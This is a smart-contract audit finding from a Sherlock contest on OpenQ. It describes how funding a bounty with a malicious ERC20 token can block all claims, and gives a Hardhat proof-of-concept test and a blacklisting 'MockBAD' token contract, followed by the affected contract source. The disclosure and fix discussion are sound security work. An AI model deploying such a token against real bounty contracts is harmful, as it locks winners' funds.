{
  "Title": "H-8: Bounties can be broken by funding them with malicious ERC20 tokens",
  "Content": "# Issue H-8: Bounties can be broken by funding them with malicious ERC20 tokens \n\nSource: https://github.com/sherlock-audit/2023-02-openq-judging/issues/62 \n\n## Found by \nrvierdiiev, oot2k, TrungOre, 0xdeadbeef, tsvetanovv, XKET, whiteh4t9527, csanuragjain, joestakey, HollaDieWaldfee, bin2chen, Tricko, 0xbepresent, kiki\\_dev, clems4ever, yixxas, jkoppel, libratus, hake, Robert, imare, HonorLt, 0x52, usmannk, sinh3ck, ctf\\_sec, slowfi, dipp, CodeFoxInc, Jeiwan, GimelSec, cccz, carrot, KingNFT\n\n## Summary\nAny malicious user can fund a bounty contract with a malicious ERC20 contract and prevent winners from withdrawing their rewards.\n## Vulnerability Detail\nThe `DepositManagerV1` contract allows any user to fund any bounty with any token, as long as the following check passes in `fundBountyToken` function\nhttps://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/DepositManager/Implementations/DepositManagerV1.sol#L45-L50\nThis check always passes as long as `tokenAddressLimitReacehd` is false, which will be the case for most cases and is a reasonable assumption to make. \n\nThe claims are handled by the `claimManagerV1` contract, which relies on every single deposited token to be successfully transferred to the target address, as can be seen with the snippet below, taken from the function `_claimAtomicBounty`\nhttps://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/ClaimManager/Implementations/ClaimManagerV1.sol#L123-L134\nand the `claimBalance` function eventually ends up using the `safeTransfer` function from the Address library to carry out the transfer as seen in `BountyCore.sol:221`\nhttps://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/Bounty/Implementations/BountyCore.sol#L221-L228\nHowever, if any of the tokens end up reverting during the `safeTransfer` call, the entire claiming call is reverted. It is quite easy for an attacker to fund the bounty with such a malicious contract, and this would essentially brick the bounty preventing the claims from being processed. This will also lock up the funds in the contract until expiry, which can be an indefinite amount of time.\n\nThis attack can be carried out in the following bounty types:\n1. AtomicBountyV1\n2. TieredFixedBounty\n3. TieredPercentageBounty\n\nby using malicious ERC20 tokens following the same attack vector.\n\n## Impact\nBricking of bounty and lock up of funds until expiry timestamp\n## Code Snippet\nThe attack can be recreated using the following test snippet\n```javascript\nit('should revert when holding malicious token', async () => {\n          // ARRANGE\n          const volume = 100\n          await openQProxy.mintBounty(\n            Constants.bountyId,\n            Constants.organization,\n            atomicBountyInitOperation\n          )\n          const bountyAddress = await openQProxy.bountyIdToAddress(\n            Constants.bountyId\n          )\n          await depositManager.fundBountyToken(\n            bountyAddress,\n            ethers.constants.AddressZero,\n            volume,\n            1,\n            Constants.funderUuid,\n            { value: volume }\n          )\n\n          // Attacker funds with bad token\n          const attacker = claimantThirdPlace\n          const MockBAD = await ethers.getContractFactory('MockBAD')\n          const mockBAD = await MockBAD.connect(attacker).deploy()\n          await mockBAD.deployed()\n          await mockBAD.connect(attacker).approve(bountyAddress, 10000000)\n          await depositManager\n            .connect(attacker)\n            .fundBountyToken(\n              bountyAddress,\n              mockBAD.address,\n              volume,\n              1,\n              Constants.funderUuid\n            )\n          // Blacklist malicious token\n          await mockBAD.connect(attacker).setBlacklist(bountyAddress)\n\n          // ACT\n          await expect(\n            claimManager\n              .connect(oracle)\n              .claimBounty(\n                bountyAddress,\n                claimant.address,\n                abiEncodedSingleCloserData\n              )\n          ).to.be.revertedWith('blacklisted')\n        })\n```\nWhere the `mockBAD` token is defined as follows, with a malicious blacklist:\n```solidity\ncontract MockBAD is ERC20 {\n    address public admin;\n    address public blacklist;\n\n    constructor() ERC20('Mock DAI', 'mDAI') {\n        blacklist = address(1);\n        _mint(msg.sender, 10000 * 10 ** 18);\n        admin = msg.sender;\n    }\n\n    function setBlacklist(address _blacklist) external {\n        require(msg.sender == admin, 'only admin');\n        blacklist = _blacklist;\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        require(from != blacklist, 'blacklisted');\n        super._beforeTokenTransfer(from, to, amount);\n    }\n}\n```\n\n## Tool used\nHardhat\nManual Review\n\n## Recommendation\nUse a try-catch block when transferring out tokens with `claimManager.sol`. This will ensure that even if there are malicious tokens, they wont revert the entire transaction.\n\n## Discussion\n\n**FlacoJones**\n\nWill fix by implementing an explicity token whitelist\n\n**FlacoJones**\n\nhttps://github.com/OpenQDev/OpenQ-Contracts/pull/113 and https://github.com/OpenQDev/OpenQ-Contracts/pull/116\n\n\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/39",
  "Code": [
    {
      "filename": "contracts/DepositManager/Implementations/DepositManagerV1.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.17;\n\nimport '../Storage/DepositManagerStorage.sol';\n\n/// @title DepositManagerV1\n/// @author FlacoJones\n/// @notice Manager contract for depositing protocol, ERC-20, and ERC-721 on bounty contracts\n/// @notice Emitter of all deposit-related events\ncontract DepositManagerV1 is DepositManagerStorageV1 {\n    constructor() {}\n\n    /// @notice Initializes the DepositManager implementation\n    /// @notice Can only be called once thanks to initializer (https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializers)\n    function initialize() external initializer {\n        __Ownable_init();\n        __UUPSUpgradeable_init();\n    }\n\n    /// @notice Sets openQTokenWhitelist address\n    /// @param _openQTokenWhitelist The OpenQTokenWhitelist address\n    function setTokenWhitelist(address _openQTokenWhitelist)\n        external\n        onlyOwner\n        onlyProxy\n    {\n        openQTokenWhitelist = OpenQTokenWhitelist(_openQTokenWhitelist);\n    }\n\n    /// @notice Transfers protocol token or ERC20 from msg.sender to bounty address\n    /// @param _bountyAddress A bounty address\n    /// @param _tokenAddress The ERC20 token address (ZeroAddress if funding with protocol token)\n    /// @param _volume The volume of token transferred\n    /// @param _expiration The duration until the deposit becomes refundable\n    /// @param funderUuid The external user id of the funder\n    function fundBountyToken(\n        address _bountyAddress,\n        address _tokenAddress,\n        uint256 _volume,\n        uint256 _expiration,\n        string memory funderUuid\n    ) external payable onlyProxy {\n        IBounty bounty = IBounty(payable(_bountyAddress));\n\n        if (!isWhitelisted(_tokenAddress)) {\n            require(\n                !tokenAddressLimitReached(_bountyAddress),\n                Errors.TOO_MANY_TOKEN_ADDRESSES\n            );\n        }\n\n        require(bountyIsOpen(_bountyAddress), Errors.CONTRACT_ALREADY_CLOSED);\n\n        (bytes32 depositId, uint256 volumeReceived) = bounty.receiveFunds{\n            value: msg.value\n        }(msg.sender, _tokenAddress, _volume, _expiration);\n\n        bytes memory funderUuidBytes = abi.encode(funderUuid);\n\n        emit TokenDepositReceived(\n            depositId,\n            _bountyAddress,\n            bounty.bountyId(),\n            bounty.organization(),\n            _tokenAddress,\n            block.timestamp,\n            msg.sender,\n            _expiration,\n            volumeReceived,\n            0,\n            funderUuidBytes,\n            VERSION_1\n        );\n    }\n\n    /// @notice Extends the expiration for a deposit\n    /// @param _bountyAddress Bounty address\n    /// @param _depositId The deposit to extend\n    /// @param _seconds The duration to add until the deposit becomes refundable\n    function extendDeposit(\n        address _bountyAddress,\n        bytes32 _depositId,\n        uint256 _seconds\n    ) external onlyProxy {\n        IBounty bounty = IBounty(payable(_bountyAddress));\n\n        require(\n            bounty.funder(_depositId) == msg.sender,\n            Errors.CALLER_NOT_FUNDER\n        );\n\n        uint256 newExpiration = bounty.extendDeposit(\n            _depositId,\n            _seconds,\n            msg.sender\n        );\n\n        emit DepositExtended(\n            _depositId,\n            newExpiration,\n            0,\n            new bytes(0),\n            VERSION_1\n        );\n    }\n\n    /// @notice Transfers NFT from msg.sender to bounty address\n    /// @param _bountyAddress The address of the bounty to fund\n    /// @param _tokenAddress The ERC721 token address of the NFT\n    /// @param _tokenId The tokenId of the NFT to transfer\n    /// @param _expiration The duration until the deposit becomes refundable\n    /// @param _data The tier of the NFT (not relevant for non-tiered bounties)\n    function fundBountyNFT(\n        address _bountyAddress,\n        address _tokenAddress,\n        uint256 _tokenId,\n        uint256 _expiration,\n        bytes calldata _data\n    ) external onlyProxy {\n        IBounty bounty = IBounty(payable(_bountyAddress));\n\n        require(isWhitelisted(_tokenAddress), Errors.TOKEN_NOT_ACCEPTED);\n        require(bountyIsOpen(_bountyAddress), Errors.CONTRACT_ALREADY_CLOSED);\n\n        bytes32 depositId = bounty.receiveNft(\n            msg.sender,\n            _tokenAddress,\n            _tokenId,\n            _expiration,\n            _data\n        );\n\n        emit NFTDepositReceived(\n            depositId,\n            _bountyAddress,\n            bounty.bountyId(),\n            bounty.organization(),\n            _tokenAddress,\n            block.timestamp,\n            msg.sender,\n            _expiration,\n            _tokenId,\n            0,\n            _data,\n            VERSION_1\n        );\n    }\n\n    /// @notice Refunds an individual deposit from bountyAddress to sender if expiration time has passed\n    /// @param _bountyAddress The address of the bounty that has the deposit to refund\n    /// @param _depositId The depositId associated with the deposit being refunded\n    function refundDeposit(address _bountyAddress, bytes32 _depositId)\n        external\n        onlyProxy\n    {\n        IBounty bounty = IBounty(payable(_bountyAddress));\n\n        require(\n            bounty.funder(_depositId) == msg.sender,\n            Errors.CALLER_NOT_FUNDER\n        );\n\n        require(\n            block.timestamp >=\n                bounty.depositTime(_depositId) + bounty.expiration(_depositId),\n            Errors.PREMATURE_REFUND_REQUEST\n        );\n\n        address depToken = bounty.tokenAddress(_depositId);\n\n        uint256 availableFunds = bounty.getTokenBalance(depToken) -\n            bounty.getLockedFunds(depToken);\n\n        uint256 volume;\n        if (bounty.volume(_depositId) <= availableFunds) {\n            volume = bounty.volume(_depositId);\n        } else {\n            volume = availableFunds;\n        }\n\n        bounty.refundDeposit(_depositId, msg.sender, volume);\n\n        emit DepositRefunded(\n            _depositId,\n            bounty.bountyId(),\n            _bountyAddress,\n            bounty.organization(),\n            block.timestamp,\n            bounty.tokenAddress(_depositId),\n            volume,\n            0,\n            new bytes(0),\n            VERSION_1\n        );\n    }\n\n    /// @notice Checks if _tokenAddress is whitelisted\n    /// @param _tokenAddress The token address in question\n    /// @return True if _tokenAddress is whitelisted, false otherwise\n    function isWhitelisted(address _tokenAddress) public view returns (bool) {\n        return openQTokenWhitelist.isWhitelisted(_tokenAddress);\n    }\n\n    /// @notice Returns true if the total number of unique tokens deposited on then bounty is greater than the OpenQWhitelist TOKEN_ADDRESS_LIMIT\n    /// @param _bountyAddress Address of bounty\n    /// @return True if the token address limit has been reached\n    function tokenAddressLimitReached(address _bountyAddress)\n        public\n        view\n        returns (bool)\n    {\n        IBounty bounty = IBounty(payable(_bountyAddress));\n\n        return\n            bounty.getTokenAddressesCount() >=\n            openQTokenWhitelist.TOKEN_ADDRESS_LIMIT();\n    }\n\n    /// @notice Checks if bounty associated with _bountyId is open\n    /// @param _bountyAddress Address of bounty\n    /// @return bool True if _bountyId is associated with an open bounty\n    function bountyIsOpen(address _bountyAddress) public view returns (bool) {\n        IBounty bounty = IBounty(payable(_bountyAddress));\n        bool isOpen = bounty.status() == OpenQDefinitions.OPEN;\n        return isOpen;\n    }\n\n    /// @notice Override for UUPSUpgradeable._authorizeUpgrade(address newImplementation) to enforce onlyOwner upgrades\n    function _authorizeUpgrade(address) internal override onlyOwner {}\n}"
    },
    {
      "filename": "contracts/ClaimManager/Implementations/ClaimManagerV1.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.17;\n\nimport '../Storage/ClaimManagerStorage.sol';\nimport '../../Bounty/Interfaces/IAtomicBounty.sol';\nimport '../../Bounty/Interfaces/ITieredBounty.sol';\nimport '../../Bounty/Interfaces/IOngoingBounty.sol';\n\n/// @title ClaimManagerV1\n/// @author FlacoJones\n/// @notice Sole contract authorized to attempt claims on all bounty types\n/// @dev Emitter of all claim-related events\n/// @dev Some claim methods are onlyOracle protected, others have exclusively on-chain claim criteria\ncontract ClaimManagerV1 is ClaimManagerStorageV1 {\n    constructor() {}\n\n    /// @notice Initializes the ClaimManager implementation with oracle address\n    /// @param _oracle The address of the oracle authorized to call onlyOracle methods (e.g. claimBounty)\n    /// @dev Can only be called once thanks to initializer (https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializers)\n    function initialize(address _oracle) external initializer onlyProxy {\n        __Ownable_init();\n        __UUPSUpgradeable_init();\n        __Oraclize_init(_oracle);\n    }\n\n    /// @notice Calls appropriate claim method based on bounty type\n    /// @param _bountyAddress The payout address of the bounty\n    /// @param _closer The payout address of the claimant\n    /// @param _closerData ABI Encoded data associated with this claim\n    /// @dev see IAtomicBounty.close(_closerData) for _closerData ABI encoding schema\n    function claimBounty(\n        address _bountyAddress,\n        address _closer,\n        bytes calldata _closerData\n    ) external onlyOracle onlyProxy {\n        IBounty bounty = IBounty(payable(_bountyAddress));\n        uint256 _bountyType = bounty.bountyType();\n\n        if (_bountyType == OpenQDefinitions.ATOMIC) {\n            // Decode to ensure data meets closerData schema before emitting any events\n            abi.decode(_closerData, (address, string, address, string));\n\n            _claimAtomicBounty(bounty, _closer, _closerData);\n            bounty.close(_closer, _closerData);\n\n            emit BountyClosed(\n                bounty.bountyId(),\n                _bountyAddress,\n                bounty.organization(),\n                _closer,\n                block.timestamp,\n                bounty.bountyType(),\n                _closerData,\n                VERSION_1\n            );\n        } else if (_bountyType == OpenQDefinitions.ONGOING) {\n            _claimOngoingBounty(bounty, _closer, _closerData);\n        } else if (_bountyType == OpenQDefinitions.TIERED_PERCENTAGE) {\n            _claimTieredPercentageBounty(bounty, _closer, _closerData);\n        } else if (_bountyType == OpenQDefinitions.TIERED_FIXED) {\n            _claimTieredFixedBounty(bounty, _closer, _closerData);\n        } else {\n            revert(Errors.UNKNOWN_BOUNTY_TYPE);\n        }\n\n        emit ClaimSuccess(block.timestamp, _bountyType, _closerData, VERSION_1);\n    }\n\n    /// @notice Used for claimants who have:\n    /// @notice A) Completed KYC with KYC DAO for their tier\n    /// @notice B) Uploaded invoicing information for their tier\n    /// @notice C) Uploaded any necessary financial forms for their tier\n    /// @param _bountyAddress The payout address of the bounty\n    /// @param _closerData ABI Encoded data associated with this claim\n    function permissionedClaimTieredBounty(\n        address _bountyAddress,\n        bytes calldata _closerData\n    ) external onlyProxy {\n        IBounty bounty = IBounty(payable(_bountyAddress));\n\n        (, , , , uint256 _tier) = abi.decode(\n            _closerData,\n            (address, string, address, string, uint256)\n        );\n\n        string memory closer = IOpenQ(openQ).addressToExternalUserId(\n            msg.sender\n        );\n\n        require(\n            keccak256(abi.encodePacked(closer)) !=\n                keccak256(abi.encodePacked('')),\n            Errors.NO_ASSOCIATED_ADDRESS\n        );\n\n        require(\n            keccak256(abi.encode(closer)) ==\n                keccak256(abi.encode(bounty.tierWinners(_tier))),\n            Errors.CLAIMANT_NOT_TIER_WINNER\n        );\n\n        if (bounty.bountyType() == OpenQDefinitions.TIERED_FIXED) {\n            _claimTieredFixedBounty(bounty, msg.sender, _closerData);\n        } else if (bounty.bountyType() == OpenQDefinitions.TIERED_PERCENTAGE) {\n            _claimTieredPercentageBounty(bounty, msg.sender, _closerData);\n        } else {\n            revert(Errors.NOT_A_COMPETITION_CONTRACT);\n        }\n\n        emit ClaimSuccess(\n            block.timestamp,\n            bounty.bountyType(),\n            _closerData,\n            VERSION_1\n        );\n    }\n\n    /// @notice Claim method for AtomicBounty\n    /// @param _bounty The payout address of the bounty\n    /// @param _closer The payout address of the claimant\n    /// @param _closerData ABI Encoded data associated with this claim\n    /// @dev See IAtomicBounty\n    function _claimAtomicBounty(\n        IAtomicBounty _bounty,\n        address _closer,\n        bytes calldata _closerData\n    ) internal {\n        _eligibleToClaimAtomicBounty(_bounty, _closer);\n\n        for (uint256 i = 0; i < _bounty.getTokenAddresses().length; i++) {\n            uint256 volume = _bounty.claimBalance(\n                _closer,\n                _bounty.getTokenAddresses()[i]\n            );\n\n            emit TokenBalanceClaimed(\n                _bounty.bountyId(),\n                address(_bounty),\n                _bounty.organization(),\n                _closer,\n                block.timestamp,\n                _bounty.getTokenAddresses()[i],\n                volume,\n                _bounty.bountyType(),\n                _closerData,\n                VERSION_1\n            );\n        }\n\n        for (uint256 i = 0; i < _bounty.getNftDeposits().length; i++) {\n            _bounty.claimNft(_closer, _bounty.nftDeposits(i));\n\n            emit NFTClaimed(\n                _bounty.bountyId(),\n                address(_bounty),\n                _bounty.organization(),\n                _closer,\n                block.timestamp,\n                _bounty.tokenAddress(_bounty.nftDeposits(i)),\n                _bounty.tokenId(_bounty.nftDeposits(i)),\n                _bounty.bountyType(),\n                _closerData,\n                VERSION_1\n            );\n        }\n    }\n\n    /// @notice Claim method for OngoingBounty\n    /// @param _bounty The payout address of the bounty\n    /// @param _closer The payout address of the claimant\n    /// @param _closerData ABI Encoded data associated with this claim\n    /// @dev see IBountyCore.claimOngoingPayout.(_closerData) for _closerData ABI encoding schema\n    function _claimOngoingBounty(\n        IOngoingBounty _bounty,\n        address _closer,\n        bytes calldata _closerData\n    ) internal {\n        _eligibleToClaimOngoingBounty(_bounty, _closer, _closerData);\n\n        (address tokenAddress, uint256 volume) = _bounty.claimOngoingPayout(\n            _closer,\n            _closerData\n        );\n\n        emit TokenBalanceClaimed(\n            _bounty.bountyId(),\n            address(_bounty),\n            _bounty.organization(),\n            _closer,\n            block.timestamp,\n            tokenAddress,\n            volume,\n            _bounty.bountyType(),\n            _closerData,\n            VERSION_1\n        );\n    }\n\n    /// @notice Claim method for TieredPercentageBounty\n    /// @param _bounty The payout address of the bounty\n    /// @param _closer The payout address of the claimant\n    /// @param _closerData ABI Encoded data associated with this claim\n    function _claimTieredPercentageBounty(\n        IBounty _bounty,\n        address _closer,\n        bytes calldata _closerData\n    ) internal {\n        (, , , , uint256 _tier) = abi.decode(\n            _closerData,\n            (address, string, address, string, uint256)\n        );\n\n        _eligibleToClaimTier(_bounty, _tier, _closer);\n\n        if (_bounty.status() == 0) {\n            _bounty.closeCompetition();\n\n            emit BountyClosed(\n                _bounty.bountyId(),\n                address(_bounty),\n                _bounty.organization(),\n                address(0),\n                block.timestamp,\n                _bounty.bountyType(),\n                new bytes(0),\n                VERSION_1\n            );\n        }\n\n        for (uint256 i = 0; i < _bounty.getTokenAddresses().length; i++) {\n            uint256 volume = _bounty.claimTiered(\n                _closer,\n                _tier,\n                _bounty.getTokenAddresses()[i]\n            );\n\n            emit TokenBalanceClaimed(\n                _bounty.bountyId(),\n                address(_bounty),\n                _bounty.organization(),\n                _closer,\n                block.timestamp,\n                _bounty.getTokenAddresses()[i],\n                volume,\n                _bounty.bountyType(),\n                _closerData,\n                VERSION_1\n            );\n        }\n\n        for (uint256 i = 0; i < _bounty.getNftDeposits().length; i++) {\n            bytes32 _depositId = _bounty.nftDeposits(i);\n            if (_bounty.tier(_depositId) == _tier) {\n                _bounty.claimNft(_closer, _depositId);\n\n                emit NFTClaimed(\n                    _bounty.bountyId(),\n                    address(_bounty),\n                    _bounty.organization(),\n                    _closer,\n                    block.timestamp,\n                    _bounty.tokenAddress(_depositId),\n                    _bounty.tokenId(_depositId),\n                    _bounty.bountyType(),\n                    _closerData,\n                    VERSION_1\n                );\n            }\n        }\n\n        _bounty.setTierClaimed(_tier);\n    }\n\n    /// @notice Claim method for TieredFixedBounty\n    /// @param _bounty The payout address of the bounty\n    /// @param _closer The payout address of the claimant\n    /// @param _closerData ABI Encoded data associated with this claim\n    function _claimTieredFixedBounty(\n        IBounty _bounty,\n        address _closer,\n        bytes calldata _closerData\n    ) internal {\n        (, , , , uint256 _tier) = abi.decode(\n            _closerData,\n            (address, string, address, string, uint256)\n        );\n\n        _eligibleToClaimTier(_bounty, _tier, _closer);\n\n        if (_bounty.status() == 0) {\n            _bounty.closeCompetition();\n\n            emit BountyClosed(\n                _bounty.bountyId(),\n                address(_bounty),\n                _bounty.organization(),\n                address(0),\n                block.timestamp,\n                _bounty.bountyType(),\n                new bytes(0),\n                VERSION_1\n            );\n        }\n\n        uint256 volume = _bounty.claimTieredFixed(_closer, _tier);\n\n        emit TokenBalanceClaimed(\n            _bounty.bountyId(),\n            address(_bounty),\n            _bounty.organization(),\n            _closer,\n            block.timestamp,\n            _bounty.payoutTokenAddress(),\n            volume,\n            _bounty.bountyType(),\n            _closerData,\n            VERSION_1\n        );\n\n        for (uint256 i = 0; i < _bounty.getNftDeposits().length; i++) {\n            bytes32 _depositId = _bounty.nftDeposits(i);\n            if (_bounty.tier(_depositId) == _tier) {\n                _bounty.claimNft(_closer, _depositId);\n\n                emit NFTClaimed(\n                    _bounty.bountyId(),\n                    address(_bounty),\n                    _bounty.organization(),\n                    _closer,\n                    block.timestamp,\n                    _bounty.tokenAddress(_depositId),\n                    _bounty.tokenId(_depositId),\n                    _bounty.bountyType(),\n                    _closerData,\n                    VERSION_1\n                );\n            }\n        }\n\n        _bounty.setTierClaimed(_tier);\n    }\n\n    /// @notice Checks if bounty associated with _bountyId is open\n    /// @return bool True if _bountyId is associated with an open bounty\n    function bountyIsClaimable(address _bountyAddress)\n        public\n        view\n        returns (bool)\n    {\n        IBounty bounty = IBounty(payable(_bountyAddress));\n\n        uint256 status = bounty.status();\n        uint256 _bountyType = bounty.bountyType();\n\n        if (\n            _bountyType == OpenQDefinitions.ATOMIC ||\n            _bountyType == OpenQDefinitions.ONGOING ||\n            _bountyType == OpenQDefinitions.TIERED_PERCENTAGE ||\n            _bountyType == OpenQDefinitions.TIERED_FIXED\n        ) {\n            return status == 0;\n        } else {\n            return status == 1;\n        }\n    }\n\n    /// @notice Override for UUPSUpgradeable._authorizeUpgrade(address newImplementation) to enforce onlyOwner upgrades\n    function _authorizeUpgrade(address) internal override onlyOwner {}\n\n    /// @notice Exposes internal method Oraclize._transferOracle(address) restricted to onlyOwner called via proxy\n    /// @param _newOracle The new oracle address\n    function transferOracle(address _newOracle) external onlyProxy onlyOwner {\n        require(_newOracle != address(0), Errors.NO_ZERO_ADDRESS);\n        _transferOracle(_newOracle);\n    }\n\n    /// @notice Sets the OpenQProxy address used for checking IOpenQ(openQ).addressToExternalUserId\n    function setOpenQ(address _openQ) external onlyProxy onlyOwner {\n        openQ = _openQ;\n    }\n\n    /// @notice Sets the KYC DAO contract address\n    /// @param _kyc The KYC DAO contract address\n    function setKyc(address _kyc) external onlyProxy onlyOwner {\n        kyc = IKycValidity(_kyc);\n    }\n\n    /// @notice Checks the current KYC DAO contract address (kyc)to see if user has a valid KYC NFT or not\n    /// @return True if address is KYC with KYC DAO, false otherwise\n    function hasKYC(address _address) public view returns (bool) {\n        return kyc.hasValidToken(_address);\n    }\n\n    /// @notice Runs all require statements to determine if the claimant can claim the specified tier on the tiered bounty\n    function _eligibleToClaimTier(\n        ITieredBounty _bounty,\n        uint256 _tier,\n        address _closer\n    ) internal view {\n        require(!_bounty.tierClaimed(_tier), Errors.TIER_ALREADY_CLAIMED);\n\n        if (_bounty.invoiceRequired()) {\n            require(\n                _bounty.invoiceComplete(_tier),\n                Errors.INVOICE_NOT_COMPLETE\n            );\n        }\n\n        if (_bounty.supportingDocumentsRequired()) {\n            require(\n                _bounty.supportingDocumentsComplete(_tier),\n                Errors.SUPPORTING_DOCS_NOT_COMPLETE\n            );\n        }\n\n        if (_bounty.kycRequired()) {\n            require(hasKYC(_closer), Errors.ADDRESS_LACKS_KYC);\n        }\n    }\n\n    /// @notice Runs all require statements to determine if the claimant can claim the atomic bounty\n    function _eligibleToClaimAtomicBounty(IAtomicBounty bounty, address _closer)\n        internal\n        view\n    {\n        require(\n            bounty.status() == OpenQDefinitions.OPEN,\n            Errors.CONTRACT_IS_NOT_CLAIMABLE\n        );\n\n        if (bounty.invoiceRequired()) {\n            bool _invoiceComplete = abi.decode(\n                bounty.getInvoiceComplete(),\n                (bool)\n            );\n            require(_invoiceComplete, Errors.INVOICE_NOT_COMPLETE);\n        }\n\n        if (bounty.supportingDocumentsRequired()) {\n            bool _supportingDocumentsComplete = abi.decode(\n                bounty.getSupportingDocumentsComplete(),\n                (bool)\n            );\n            require(\n                _supportingDocumentsComplete,\n                Errors.SUPPORTING_DOCS_NOT_COMPLETE\n            );\n        }\n\n        if (bounty.kycRequired()) {\n            require(hasKYC(_closer), Errors.ADDRESS_LACKS_KYC);\n        }\n    }\n\n    /// @notice Runs all require statements to determine if the claimant can claim an ongoing bounty payout\n    function _eligibleToClaimOngoingBounty(\n        IOngoingBounty bounty,\n        address _closer,\n        bytes memory _closerData\n    ) internal view {\n        require(\n            bounty.status() == OpenQDefinitions.OPEN,\n            Errors.CONTRACT_IS_NOT_CLAIMABLE\n        );\n\n        (, string memory claimant, , string memory claimantAsset) = abi.decode(\n            _closerData,\n            (address, string, address, string)\n        );\n\n        bytes32 claimId = bounty.generateClaimId(claimant, claimantAsset);\n\n        if (bounty.invoiceRequired()) {\n            require(\n                bounty.invoiceComplete(claimId),\n                Errors.INVOICE_NOT_COMPLETE\n            );\n        }\n\n        if (bounty.supportingDocumentsRequired()) {\n            require(\n                bounty.supportingDocumentsComplete(claimId),\n                Errors.SUPPORTING_DOCS_NOT_COMPLETE\n            );\n        }\n\n        if (bounty.kycRequired()) {\n            require(hasKYC(_closer), Errors.ADDRESS_LACKS_KYC);\n        }\n    }\n}"
    },
    {
      "filename": "contracts/Bounty/Implementations/BountyCore.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.17;\n\nimport '../Storage/BountyStorageCore.sol';\n\n/// @title BountyCore\n/// @author FlacoJones\n/// @notice Shared methods common to all bounty types\n/// @dev BountyCore -> BountyStorageCore -> Core Dependencies (OZ + Custom)\nabstract contract BountyCore is BountyStorageCore {\n    using SafeERC20Upgradeable for IERC20Upgradeable;\n    using AddressUpgradeable for address payable;\n    using EnumerableSetUpgradeable for EnumerableSetUpgradeable.AddressSet;\n\n    /// @notice Creates a deposit and transfers tokens from msg.sender to this contract\n    /// @param _funder The funder's address\n    /// @param _tokenAddress The ERC20 token address (ZeroAddress if funding with protocol token)\n    /// @param _volume The volume of token to transfer\n    /// @param _expiration The duration until the deposit becomes refundable\n    /// @return (depositId, volumeReceived) Returns the deposit id and the amount transferred to bounty\n    function receiveFunds(\n        address _funder,\n        address _tokenAddress,\n        uint256 _volume,\n        uint256 _expiration\n    )\n        external\n        payable\n        virtual\n        onlyDepositManager\n        nonReentrant\n        returns (bytes32, uint256)\n    {\n        require(_volume != 0, Errors.ZERO_VOLUME_SENT);\n        require(_expiration > 0, Errors.EXPIRATION_NOT_GREATER_THAN_ZERO);\n        require(status == OpenQDefinitions.OPEN, Errors.CONTRACT_IS_CLOSED);\n\n        bytes32 depositId = _generateDepositId();\n\n        uint256 volumeReceived;\n        if (_tokenAddress == address(0)) {\n            volumeReceived = msg.value;\n        } else {\n            volumeReceived = _receiveERC20(_tokenAddress, _funder, _volume);\n        }\n\n        funder[depositId] = _funder;\n        tokenAddress[depositId] = _tokenAddress;\n        volume[depositId] = volumeReceived;\n        depositTime[depositId] = block.timestamp;\n        expiration[depositId] = _expiration;\n        isNFT[depositId] = false;\n\n        deposits.push(depositId);\n        tokenAddresses.add(_tokenAddress);\n\n        return (depositId, volumeReceived);\n    }\n\n    /// @notice Transfers volume of deposit or NFT of deposit from bounty to funder\n    /// @param _depositId The deposit to refund\n    /// @param _funder The initial funder of the deposit\n    /// @param _volume The volume to be refunded (only relevant if deposit is not an NFT, otherwise is zero)\n    function refundDeposit(\n        bytes32 _depositId,\n        address _funder,\n        uint256 _volume\n    ) external virtual onlyDepositManager nonReentrant {\n        require(!refunded[_depositId], Errors.DEPOSIT_ALREADY_REFUNDED);\n        require(funder[_depositId] == _funder, Errors.CALLER_NOT_FUNDER);\n        require(\n            block.timestamp >= depositTime[_depositId] + expiration[_depositId],\n            Errors.PREMATURE_REFUND_REQUEST\n        );\n\n        refunded[_depositId] = true;\n\n        if (tokenAddress[_depositId] == address(0)) {\n            _transferProtocolToken(funder[_depositId], _volume);\n        } else if (isNFT[_depositId]) {\n            _transferNft(\n                tokenAddress[_depositId],\n                funder[_depositId],\n                tokenId[_depositId]\n            );\n        } else {\n            _transferERC20(\n                tokenAddress[_depositId],\n                funder[_depositId],\n                _volume\n            );\n        }\n    }\n\n    /// @notice Extends deposit duration\n    /// @param _depositId The deposit to extend\n    /// @param _seconds Number of seconds to extend deposit\n    /// @param _funder The initial funder of the deposit\n    function extendDeposit(\n        bytes32 _depositId,\n        uint256 _seconds,\n        address _funder\n    ) external virtual onlyDepositManager nonReentrant returns (uint256) {\n        require(status == OpenQDefinitions.OPEN, Errors.CONTRACT_IS_CLOSED);\n        require(!refunded[_depositId], Errors.DEPOSIT_ALREADY_REFUNDED);\n        require(funder[_depositId] == _funder, Errors.CALLER_NOT_FUNDER);\n\n        if (\n            block.timestamp > depositTime[_depositId] + expiration[_depositId]\n        ) {\n            expiration[_depositId] =\n                block.timestamp -\n                depositTime[_depositId] +\n                _seconds;\n        } else {\n            expiration[_depositId] = expiration[_depositId] + _seconds;\n        }\n\n        return expiration[_depositId];\n    }\n\n    /// @notice Transfers NFT from bounty address to _payoutAddress\n    /// @param _payoutAddress The destination address for the NFT\n    /// @param _depositId The payout address of the bounty\n    function claimNft(address _payoutAddress, bytes32 _depositId)\n        external\n        virtual\n        onlyClaimManager\n        nonReentrant\n    {\n        _transferNft(\n            tokenAddress[_depositId],\n            _payoutAddress,\n            tokenId[_depositId]\n        );\n    }\n\n    /// @notice Sets the funding goal\n    /// @param _fundingToken Token address for funding goal\n    /// @param _fundingGoal Token volume for funding goal\n    function setFundingGoal(address _fundingToken, uint256 _fundingGoal)\n        external\n        virtual\n        onlyOpenQ\n    {\n        fundingGoal = _fundingGoal;\n        fundingToken = _fundingToken;\n        hasFundingGoal = true;\n    }\n\n    /// @notice Whether or not KYC is required to fund and claim the bounty\n    /// @param _kycRequired Whether or not KYC is required to fund and claim the bounty\n    function setKycRequired(bool _kycRequired) external virtual onlyOpenQ {\n        kycRequired = _kycRequired;\n    }\n\n    /// @notice 